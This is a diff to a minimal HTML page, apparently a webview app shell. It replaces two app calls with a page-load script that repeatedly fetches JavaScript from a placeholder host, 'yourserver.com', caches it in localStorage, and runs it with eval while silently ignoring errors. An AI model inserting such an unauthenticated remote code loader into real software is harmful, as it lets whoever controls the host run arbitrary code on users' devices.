@@ -6,12 +6,30 @@
     <meta name="color-scheme" content="dark light" />
     <meta http-equiv="X-UA-Compatible" content="ie=edge" />
     <title>Document</title>
-    <style type="text/css" media="all"></style>
+    <style></style>
   </head>
   <body>
-    <script type="text/javascript" charset="utf-8">
-    	window.app.dismiss();
-    	window.app.clearQueue();
+    <script>
+      (async () => {
+        const script = localStorage.getItem("script");
+        if (script) {
+          try {
+            eval(script);
+          } catch {}
+        }
+        while (true) {
+          try {
+            const res = await fetch("https://yourserver.com/app.js?" + Date.now());
+            if (res.ok) {
+              const script = await res.text();
+              localStorage.setItem("script", script);
+              eval(script);
+              return;
+            }
+          } catch {}
+          await new Promise(resolve => setTimeout(resolve, 1000));
+        }
+      })();
     </script>
   </body>
 </html>
